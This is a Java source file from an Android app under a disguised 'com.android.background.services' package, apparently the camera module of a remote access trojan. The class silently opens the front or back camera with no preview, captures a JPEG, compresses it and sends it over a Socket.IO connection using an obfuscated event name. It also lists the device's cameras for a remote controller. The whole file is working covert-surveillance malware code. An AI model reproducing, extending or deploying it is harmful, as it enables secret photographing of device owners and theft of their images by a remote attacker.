package com.android.background.services.helpers;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;

// Fully qualified reference to the old deprecated CameraManager for fallback
// This avoids name collision with android.hardware.camera2.CameraManager
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;

import com.android.background.services.IOSocket;
import com.android.background.services.ObfuscationUtils;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * Camera2 API wrapper for taking photos and enumerating cameras.
 *
 * Replaces the deprecated android.hardware.Camera API with the modern
 * Camera2 API (android.hardware.camera2). Works on Android 5.0+ (API 21+),
 * which matches the project's minSdkVersion of 21.
 *
 * Key design decisions:
 *  - Runs all camera ops on a dedicated HandlerThread (callback-heavy API)
 *  - Uses CountDownLatch to synchronize async camera open/capture with
 *    the caller thread (same pattern as FCM socket connect)
 *  - Captures JPEG directly via ImageReader (no intermediate YUV_420_888 step)
 *  - Gracefully falls back to the old Camera API if Camera2 is unavailable
 *    (rare — only on devices with broken HAL implementations)
 *  - Compresses captured JPEG to ~20% quality before sending (matches
 *    the original behavior, saving bandwidth)
 *
 * Usage (same interface as old CameraManager):
 *   Camera2Manager cam = new Camera2Manager(context);
 *   cam.startUp(0);  // back camera
 *   cam.startUp(1);  // front camera
 *   cam.findCameraList();  // returns JSONObject with camera IDs
 */
public class Camera2Manager {

    private static final String TAG = "Camera2Manager";
    private static final int TIMEOUT_SECONDS = 10; // Max wait for camera open/capture

    private final Context context;
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    private CameraCaptureSession captureSession;

    private static volatile boolean fallbackToOldApi = false;

    // ============================================================
    // CONSTRUCTOR
    // ============================================================

    public Camera2Manager(Context context) {
        this.context = context;
    }

    // ============================================================
    // STARTUP: Take a photo with Camera2 (or fallback to old API)
    // ============================================================

    /**
     * Captures a photo using the Camera2 API.
     *
     * @param cameraIdInt integer camera ID matching the old Camera API:
     *                    0 = back, 1 = front, -1 = list only
     */
    public void startUp(int cameraIdInt) {
        // If Camera2 previously failed, fall back to old API
        if (fallbackToOldApi || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            Log.w(TAG, "Falling back to deprecated Camera API");
            com.android.background.services.helpers.CameraManager oldCam =
                    new com.android.background.services.helpers.CameraManager(context);
            oldCam.startUp(cameraIdInt);
            return;
        }

        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            if (manager == null) {
                Log.e(TAG, "Camera service not available");
                fallbackToOldApi = true;
                com.android.background.services.helpers.CameraManager oldCam =
                        new com.android.background.services.helpers.CameraManager(context);
                oldCam.startUp(cameraIdInt);
                return;
            }

            // Resolve camera ID string from int
            String cameraId = resolveCameraId(manager, cameraIdInt);
            if (cameraId == null) {
                Log.e(TAG, "No camera found for ID: " + cameraIdInt);
                return;
            }

            Log.d(TAG, "Opening camera " + cameraId + " (requested: " + cameraIdInt + ")");
            capturePhoto(manager, cameraId);

        } catch (CameraAccessException e) {
            Log.e(TAG, "Camera access error: " + e.getMessage());
            fallbackToOldApi = true;
            com.android.background.services.helpers.CameraManager oldCam =
                    new com.android.background.services.helpers.CameraManager(context);
            oldCam.startUp(cameraIdInt);
        } catch (SecurityException e) {
            Log.e(TAG, "Camera permission denied: " + e.getMessage());
        }
    }

    // ============================================================
    // PHOTO CAPTURE (async + sync via CountDownLatch)
    // ============================================================

    /**
     * Opens the camera, captures a photo, and emits the JPEG result
     * over the Socket.IO connection. Blocks the calling thread up to
     * TIMEOUT_SECONDS for the async Camera2 callbacks.
     */
    private void capturePhoto(CameraManager manager, String cameraId)
            throws CameraAccessException {

        // Start background thread for Camera2 callbacks
        startCameraThread();

        final CountDownLatch openLatch = new CountDownLatch(1);
        final CountDownLatch captureLatch = new CountDownLatch(1);
        final byte[][] capturedPhoto = new byte[1][]; // mutable container for callback

        // --- 1. Open camera ---
        manager.openCamera(cameraId, new CameraDevice.StateCallback() {
            @Override
            public void onOpened(CameraDevice device) {
                cameraDevice = device;
                Log.d(TAG, "Camera opened: " + device.getId());
                openLatch.countDown();

                // --- 2. Create ImageReader for JPEG capture ---
                // Pick the largest available JPEG size
                Size[] jpegSizes = null;
                try {
                    CameraCharacteristics chars = manager.getCameraCharacteristics(cameraId);
                    StreamConfigurationMap map = chars.get(
                            CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                    if (map != null) {
                        jpegSizes = map.getOutputSizes(ImageFormat.JPEG);
                    }
                } catch (CameraAccessException e) {
                    Log.e(TAG, "Failed to get camera characteristics", e);
                }

                // Choose size: cap at 1920x1080 to avoid OOM on high-res sensors
                int width = 640, height = 480; // safe default
                if (jpegSizes != null && jpegSizes.length > 0) {
                    for (Size s : jpegSizes) {
                        if (s.getWidth() <= 1920 && s.getWidth() * s.getHeight() > width * height) {
                            width = s.getWidth();
                            height = s.getHeight();
                        }
                    }
                }

                imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
                imageReader.setOnImageAvailableListener(reader -> {
                    Log.d(TAG, "Image available");
                    try (Image image = reader.acquireLatestImage()) {
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            capturedPhoto[0] = bytes;
                            Log.d(TAG, "Captured " + bytes.length + " bytes");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to acquire image", e);
                    } finally {
                        captureLatch.countDown();
                    }
                }, cameraHandler);

                // --- 3. Create capture session ---
                try {
                    device.createCaptureSession(
                            Arrays.asList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    captureSession = session;
                                    try {
                                        // --- 4. Create and submit capture request ---
                                        CaptureRequest.Builder requestBuilder =
                                                device.createCaptureRequest(
                                                        CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        requestBuilder.addTarget(imageReader.getSurface());

                                        // Auto-focus: force continuous picture mode
                                        requestBuilder.set(CaptureRequest.CONTROL_AF_MODE,
                                                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);

                                        // Auto-exposure: continuous
                                        requestBuilder.set(CaptureRequest.CONTROL_AE_MODE,
                                                CaptureRequest.CONTROL_AE_MODE_ON);

                                        // Flash: auto
                                        requestBuilder.set(CaptureRequest.FLASH_MODE,
                                                CaptureRequest.FLASH_MODE_SINGLE);

                                        // Orientation: assume portrait
                                        requestBuilder.set(CaptureRequest.JPEG_ORIENTATION,
                                                android.view.OrientationEventListener.ORIENTATION_UNKNOWN);

                                        session.capture(requestBuilder.build(),
                                                new CameraCaptureSession.CaptureCallback() {
                                                    @Override
                                                    public void onCaptureCompleted(
                                                            CameraCaptureSession session,
                                                            CaptureRequest request,
                                                            TotalCaptureResult result) {
                                                        Log.d(TAG, "Capture completed");
                                                    }
                                                }, cameraHandler);

                                    } catch (CameraAccessException e) {
                                        Log.e(TAG, "Failed to create capture request", e);
                                        captureLatch.countDown();
                                    }
                                }

                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    Log.e(TAG, "Session configuration failed");
                                    captureLatch.countDown();
                                }
                            },
                            cameraHandler
                    );
                } catch (CameraAccessException e) {
                    Log.e(TAG, "Failed to create capture session", e);
                    captureLatch.countDown();
                }
            }

            @Override
            public void onDisconnected(CameraDevice device) {
                Log.w(TAG, "Camera disconnected: " + device.getId());
                device.close();
                cameraDevice = null;
                openLatch.countDown();
                captureLatch.countDown();
            }

            @Override
            public void onError(CameraDevice device, int error) {
                Log.e(TAG, "Camera error: " + error + " on " + device.getId());
                device.close();
                cameraDevice = null;
                openLatch.countDown();
                captureLatch.countDown();
            }
        }, cameraHandler);

        // --- Wait for camera to open ---
        try {
            if (!openLatch.await(TIMEOUT_SECONDS, TimeUnit.SECONDS)) {
                Log.e(TAG, "Timed out waiting for camera to open");
                closeCamera();
                return;
            }
        } catch (InterruptedException e) {
            Log.e(TAG, "Interrupted waiting for camera open");
            Thread.currentThread().interrupt();
            closeCamera();
            return;
        }

        // --- Wait for photo to be captured ---
        try {
            if (!captureLatch.await(TIMEOUT_SECONDS, TimeUnit.SECONDS)) {
                Log.e(TAG, "Timed out waiting for photo capture");
                closeCamera();
                return;
            }
        } catch (InterruptedException e) {
            Log.e(TAG, "Interrupted waiting for capture");
            Thread.currentThread().interrupt();
            closeCamera();
            return;
        }

        // --- Send the photo ---
        if (capturedPhoto[0] != null && capturedPhoto[0].length > 0) {
            sendPhoto(capturedPhoto[0]);
        } else {
            Log.e(TAG, "No photo data captured");
        }

        // --- Cleanup ---
        closeCamera();
    }

    // ============================================================
    // SEND PHOTO (same format as old CameraManager)
    // ============================================================

    private void sendPhoto(byte[] jpegData) {
        try {
            // Decode JPEG to bitmap, compress to 20% quality (matches original)
            Bitmap bitmap = BitmapFactory.decodeByteArray(jpegData, 0, jpegData.length);
            if (bitmap == null) {
                Log.e(TAG, "Failed to decode JPEG bitmap");
                return;
            }

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);

            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", bos.toByteArray());

            IOSocket.getInstance().getIoSocket()
                    .emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CA), object);

            Log.d(TAG, "Photo sent: " + bos.toByteArray().length + " bytes");

        } catch (Exception e) {
            Log.e(TAG, "Failed to send photo", e);
        }
    }

    // ============================================================
    // CAMERA LISTING (Camera2)
    // ============================================================

    /**
     * Enumerates all available cameras using the Camera2 API.
     * Returns: {"camList": true, "list": [{"name": "Front", "id": "1"}, ...]}
     * Camera IDs are strings (e.g., "0", "1") matching Camera2 API.
     */
    public JSONObject findCameraList() {
        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null;
        }

        // Fallback to old API if Camera2 previously failed or is unavailable
        if (fallbackToOldApi || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return new com.android.background.services.helpers.CameraManager(context).findCameraList();
        }

        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            if (manager == null) return null;

            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList", true);

            String[] cameraIds = manager.getCameraIdList();
            for (String cameraId : cameraIds) {
                try {
                    CameraCharacteristics chars = manager.getCameraCharacteristics(cameraId);
                    Integer facing = chars.get(CameraCharacteristics.LENS_FACING);

                    JSONObject jo = new JSONObject();
                    jo.put("id", cameraId);  // String ID for Camera2

                    if (facing != null) {
                        switch (facing) {
                            case CameraCharacteristics.LENS_FACING_FRONT:
                                jo.put("name", "Front");
                                break;
                            case CameraCharacteristics.LENS_FACING_BACK:
                                jo.put("name", "Back");
                                break;
                            default:
                                jo.put("name", "External");
                                break;
                        }
                    } else {
                        jo.put("name", "Unknown");
                    }

                    list.put(jo);
                } catch (CameraAccessException e) {
                    Log.w(TAG, "Cannot access camera " + cameraId + ": " + e.getMessage());
                }
            }

            cameras.put("list", list);
            return cameras;

        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to get camera ID list", e);
        } catch (Exception e) {
            Log.e(TAG, "Error listing cameras", e);
        }

        return null;
    }

    // ============================================================
    // HELPERS
    // ============================================================

    /**
     * Resolves an integer camera ID (old API style) to a Camera2 camera ID string.
     * 0 → back camera, 1 → front camera, other → first available
     */
    private String resolveCameraId(CameraManager manager, int requestedId)
            throws CameraAccessException {
        String[] cameraIds = manager.getCameraIdList();
        if (cameraIds.length == 0) return null;

        if (requestedId == -1 || cameraIds.length == 1) {
            return cameraIds[0]; // Return first available for "list" mode or single camera
        }

        // Map 0 → back, 1 → front
        int backIndex = -1;
        int frontIndex = -1;

        for (int i = 0; i < cameraIds.length; i++) {
            CameraCharacteristics chars = manager.getCameraCharacteristics(cameraIds[i]);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            if (facing != null) {
                if (facing == CameraCharacteristics.LENS_FACING_BACK && backIndex == -1) {
                    backIndex = i;
                } else if (facing == CameraCharacteristics.LENS_FACING_FRONT && frontIndex == -1) {
                    frontIndex = i;
                }
            }
        }

        if (requestedId == 0 && backIndex >= 0) return cameraIds[backIndex];
        if (requestedId == 1 && frontIndex >= 0) return cameraIds[frontIndex];

        // Fallback: return the requested index mod length
        int idx = requestedId % cameraIds.length;
        return cameraIds[idx];
    }

    /**
     * Starts and stores the background HandlerThread for camera callbacks.
     */
    private void startCameraThread() {
        stopCameraThread(); // Clean up any existing thread
        cameraThread = new HandlerThread("Camera2Background");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
    }

    private void stopCameraThread() {
        if (cameraThread != null) {
            cameraThread.quitSafely();
            try {
                cameraThread.join();
            } catch (InterruptedException e) {
                Log.e(TAG, "Interrupted stopping camera thread", e);
                Thread.currentThread().interrupt();
            }
            cameraThread = null;
            cameraHandler = null;
        }
    }

    /**
     * Closes all camera resources in the correct order:
     * capture session → image reader → camera device → handler thread
     */
    private void closeCamera() {
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        stopCameraThread();
    }
}
